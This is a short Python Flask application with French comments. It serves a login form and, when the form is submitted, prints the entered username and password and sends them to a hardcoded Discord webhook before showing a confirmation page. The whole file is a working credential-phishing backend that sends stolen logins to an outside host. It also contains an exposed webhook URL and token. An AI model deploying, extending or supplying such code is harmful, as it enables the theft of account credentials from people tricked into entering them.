from flask import Flask, request, render_template
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1360080907943547042/07vl21iNbNRz20pWo9nEZiCBIY5cv_6Mphy20rOVZiBxaeUXulqU7VfNqMMX_mOMKhYS"

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        print("Tentative de connexion :")
        print("Nom d'utilisateur :", username)
        print("Mot de passe :", password)

        # Envoi à Discord
        content = f"**🔐 Connexion reçue :**\n👤 Utilisateur : `{username}`\n🔑 Mot de passe : `{password}`"
        requests.post(WEBHOOK_URL, json={"content": content})
        
        return render_template("confirmation.html")
    return render_template("login.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
